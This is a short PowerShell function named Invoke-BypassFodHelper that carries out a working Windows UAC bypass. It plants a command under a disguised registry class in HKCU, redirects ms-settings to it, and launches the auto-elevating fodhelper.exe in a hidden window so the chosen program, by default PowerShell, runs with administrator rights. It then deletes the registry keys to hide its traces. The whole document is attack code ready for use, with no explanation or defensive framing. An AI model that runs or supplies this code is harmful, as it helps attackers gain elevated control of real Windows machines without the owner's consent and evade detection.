function Invoke-BypassFodHelper { 
    Param (    
        [String]$program = "cmd /c start powershell.exe"
    )
    
    New-Item "HKCU:\Software\Classes\.versionobf\Shell\Open\command" -Force| Out-Null
    Set-ItemProperty "HKCU:\Software\Classes\.versionobf\Shell\Open\command" -Name "(default)" -Value $program  -Force | Out-Null
    
    New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force|out-null
    Set-ItemProperty  "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -value ".versionobf" -force | Out-Null
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    
    Start-Sleep 5
    
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Remove-Item "HKCU:\Software\Classes\.versionobf\" -Recurse -Force
}